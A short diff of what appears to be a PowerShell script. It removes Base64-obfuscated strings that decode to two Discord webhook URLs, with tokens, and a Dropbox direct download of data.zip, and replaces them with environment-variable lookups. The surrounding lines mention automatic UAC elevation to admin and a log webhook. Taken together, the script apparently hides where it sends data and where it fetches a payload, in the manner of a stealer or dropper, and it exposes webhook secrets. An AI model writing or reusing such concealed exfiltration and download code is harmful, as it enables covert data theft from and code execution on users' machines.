@@ -1,7 +1,6 @@
-$d={[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($args[0]))}
-$LW=& $d 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMTIxNTg5MDQ0MjYyMDk5OC9MejhYZloyOGFGMFhhVWI2dTBSWU9QTkdFYlIzbnRTX05NOVM1LThXTDJBUlh3OHVyX3R2T1NIaFF5LU9uX1F1bFVueg=='
-$DW=& $d 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMDYxNzYwNjM2MzU0NTcwMC9PYWt6VWJzQURvQUg0TmtubUhTSi1ibTJjSzRmZ3c5cE56Q3M5WW1ZTlVZMHhaR21tSVJfZEEzWjhReFVJUjhnNVFCQg=='
-$DU=& $d 'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL3FxMzRvOWl0NHJnYWxlamM3eWczaS9kYXRhLnppcD9ybGtleT1hOTlvYWtrMDV5Z3A2aW1iYjRteWllbDdoJnN0PWRxd3l3M29tJmRsPTE='
+$LW=$env:LW
+$DW=$env:DW
+$DU=$env:DU
 # Auto-elevate to admin (UAC)
 $LogWebhook = "$LW"
 
